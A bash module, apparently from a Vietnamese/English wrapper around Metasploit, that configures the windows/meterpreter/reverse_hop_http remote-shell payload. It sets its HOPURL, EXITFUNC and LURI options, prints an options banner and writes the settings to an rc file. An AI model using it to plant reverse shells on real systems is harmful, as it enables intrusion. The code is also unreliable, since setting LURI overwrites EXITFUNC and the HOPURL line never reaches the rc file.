function defaul_payload_options {
	hopurl="http://example.com/hop.php"
	exitfunc="process"
	luri=""
}
function payload_compare {
hopurl_lenght=`echo $hopurl | awk '{print length}'`
	if  [ "$hopurl_lenght" -le 18 ]; then
		payload1
	else
		payload2
	fi
}
function set_payload {
		if [[ "$new_processing_variables" = "hopurl" ]] || [[ "$new_processing_variables" = "HOPURL" ]] || [[ "$new_processing_variables" = "Hopurl" ]]; then
			unset hopurl
			hopurl=$module_set
		elif [[ "$new_processing_variables" = "exitfunc" ]] || [[ "$new_processing_variables" = "EXITFUNC" ]] || [[ "$new_processing_variables" = "Exitfunc" ]]; then
			if [[ "$module_set" = "" ]] || [[ "$module_set" = "" ]] || [[ "$module_set" = "" ]]; then
				unset exitfunc
				exitfunc="$module_set"
			elif [[ "$module_set" = "seh" ]] || [[ "$module_set" = "SEH" ]] || [[ "$module_set" = "Seh" ]]; then
				unset exitfunc
				exitfunc="$module_set"
			elif [[ "$module_set" = "thread" ]] || [[ "$module_set" = "THREAD" ]] || [[ "$module_set" = "Thread" ]]; then
				unset exitfunc
				exitfunc="$module_set"
			elif [[ "$module_set" = "process" ]] || [[ "$module_set" = "PROCESS" ]] || [[ "$module_set" = "Process," ]]; then
				unset exitfunc
				exitfunc="$module_set"
			elif [[ "$module_set" = "none" ]] || [[ "$module_set" = "NONE" ]] || [[ "$module_set" = "None" ]]; then
				unset exitfunc
				exitfunc="$module_set"
			else 	failed_to_validate=" $failed_validate'$module_set' $notvalid '$new_processing_variables'"
				echo -e "$red[-]$RESET" $failed_to_validate
			fi
		elif [[ "$new_processing_variables" = "luri" ]] || [[ "$new_processing_variables" = "LURI" ]] || [[ "$new_processing_variables" = "Luri" ]]; then
			unset exitfunc
			exitfunc="$module_set"
		fi
}
function payload1 {
none=" "
myvar=""
	function unset_value {
		unset none
		unset myvar
		unset integer
		none=" "
		myvar=""
	}
hopurl=`echo $hopurl`
hopurl_lenght=`echo $hopurl | awk '{print length}'`
	integer=`expr 18 - $hopurl_lenght`			
	for (( i = 0 ; i < $integer; i++ )) do
		myvar=$myvar$none
	done
	hopurl=$hopurl$myvar
unset_value
exitfunc=`echo $exitfunc`
exitfunc_lenght=`echo $exitfunc | awk '{print length}'`
	integer=`expr 18 - $exitfunc_lenght`			
	for (( i = 0 ; i < $integer; i++ )) do
	myvar=$myvar$none
	done
	exitfunc=$exitfunc$myvar
unset_value
luri=`echo $luri`
luri_lenght=`echo $luri | awk '{print length}'`
	integer=`expr 18 - $luri_lenght`			
	for (( i = 0 ; i < $integer; i++ )) do
	myvar=$myvar$none
	done
	luri=$luri$myvar
unset_value
payload_banner_1
}
function payload2 {
none=" "
myvar=""
	function unset_value {
		unset none
		unset myvar
		unset integer
		none=" "
		myvar=""
	}
hopurl=`echo $hopurl`
hopurl_lenght=`echo $hopurl | awk '{print length}'`
	integer=`expr 27 - $hopurl_lenght`			
	for (( i = 0 ; i < $integer; i++ )) do
		myvar=$myvar$none
	done
	hopurl=$hopurl$myvar
unset_value
exitfunc=`echo $exitfunc`
exitfunc_lenght=`echo $exitfunc | awk '{print length}'`
	integer=`expr 27 - $exitfunc_lenght`			
	for (( i = 0 ; i < $integer; i++ )) do
	myvar=$myvar$none
	done
	exitfunc=$exitfunc$myvar
unset_value
luri=`echo $luri`
luri_lenght=`echo $luri | awk '{print length}'`
	integer=`expr 27 - $luri_lenght`			
	for (( i = 0 ; i < $integer; i++ )) do
	myvar=$myvar$none
	done
	luri=$luri$myvar
unset_value
payload_banner_2
}
function payload_banner_1 {
if [ "$language" = "VN" ]; then
yes="     Có   "
no="     Không "
cat << !
Các tùy chọn của tải trọng (windows/meterpreter/reverse_hop_http):

   Tên            Thiết lập hiện tại    Yêu cầu   Miêu tả
   ----           ----------------      --------  -----------
   EXITFUNC       $exitfunc$no   Biện pháp tạo lối thoát (Được chấp nhận: '', seh, thread, process, none).
   HOPURL         $hopurl$yes    URL đầy đủ của tập lệnh hop.
   LURI           $luri$no   Đường dẫn HTTP.

!
elif [ "$language" = "EN" ]; then
yes="     yes"
no="     no "
cat << !
Payload options (windows/meterpreter/reverse_hop_http):

   Name           Current Setting       Required  Description
   ----           ---------------       --------  -----------
   EXITFUNC       $exitfunc$no      Exit technique (Accepted: '', seh, thread, process, none).
   HOPURL         $hopurl$yes      The full URL of the hop script.
   LURI           $luri$no      The HTTP Path.

!
fi
}
function payload_banner_2 {
if [ "$language" = "VN" ]; then
yes="   Có  "
no="   Không "
cat << !
Các tùy chọn của tải trọng (windows/meterpreter/reverse_hop_http):

   Tên            Thiết lập hiện tại	       Yêu cầu    Miêu tả
   ----      	  ---------------  	       --------  -----------
   EXITFUNC       $exitfunc$no   Biện pháp tạo lối thoát (Được chấp nhận: '', seh, thread, process, none).
   HOPURL         $hopurl$yes     URL đầy đủ của tập lệnh hop.
   LURI           $luri$no   Đường dẫn HTTP.

!
elif [ "$language" = "EN" ]; then
yes="   yes"
no="   no "
cat << !
Payload options (windows/meterpreter/reverse_hop_http):

   Name           Current Setting  	       Required  Description
   ----           ---------------  	       --------  -----------
   EXITFUNC       $exitfunc$no      Exit technique (Accepted: '', seh, thread, process, none).
   HOPURL         $hopurl$yes      The full URL of the hop script.
   LURI           $luri$no      The HTTP Path.

!
fi
}
function payload_run {
payload_path_present=`pwd`
payload_path_rc_file="$payload_path_present/Config"
rc_file="$payload_path_rc_file/file.rc"
config_file="$payload_path_present/Config/config"
	echo "set payload windows/meterpreter/reverse_hop_http" >> $rc_file
	echo "set HOPURL $hopurl"
	echo "set EXITFUNC $exitfunc" >> $rc_file
	echo "set LURI $luri" >> $rc_file
	paylo="windows/meterpreter/reverse_hop_http"

}
